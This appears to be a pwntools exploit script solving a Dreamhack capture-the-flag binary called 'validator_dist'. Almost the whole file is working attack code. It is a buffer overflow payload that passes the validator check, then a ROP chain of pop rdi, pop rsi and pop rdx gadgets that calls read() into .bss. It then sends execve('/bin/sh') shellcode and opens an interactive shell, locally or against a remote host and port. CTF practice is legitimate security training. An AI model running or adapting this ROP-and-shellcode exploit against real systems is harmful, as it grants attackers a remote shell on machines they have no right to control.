from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './validator_dist'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
#context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
rop = ROP(elf)
payload = b"DREAMHACK!\x21\x7f\x7e\x7d\x7c\x7b\x7a\x79\x78\x77\x76\x75\x74\x73\x72\x71\x70\x6f\x6e\x6d\x6c\x6b\x6a\x69\x68\x67\x66\x65\x64\x63\x62\x61\x60\x5f\x5e\x5d\x5c\x5b\x5a\x59\x58\x57\x56\x55\x54\x53\x52\x51\x50\x4f\x4e\x4d\x4c\x4b\x4a\x49\x48\x47\x46\x45\x44\x43\x42\x41\x40\x3f\x3e\x3d\x3c\x3b\x3a\x39\x38\x37\x36\x35\x34\x33\x32\x31\x30\x2f\x2e\x2d\x2c\x2b\x2a\x29\x28\x27\x26\x25\x24\x23\x22\x21\x20\x1f\x1e\x1d\x1c\x1b\x1a\x19\x18\x17\x16\x15\x14\x13\x12\x11\x10\x0f\x0e\x0d\x0c\x0b\x0aaaaaaaa"
 
payload += p64(0x4006f3) # pop rdi; ret
payload += p64(0)
payload += p64(0x4006f1) # pop rsi ; pop r15 ; ret
payload += p64(elf.bss(0x0))
payload += p64(0) # dummy
payload += p64(0x40057b) # pop rdx; ret
payload += p64(0x50)
payload += p64(elf.symbols["read"])
 
payload += p64(elf.bss(0x0))
p.sendline(payload)
p.sendline(b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05")
p.interactive()
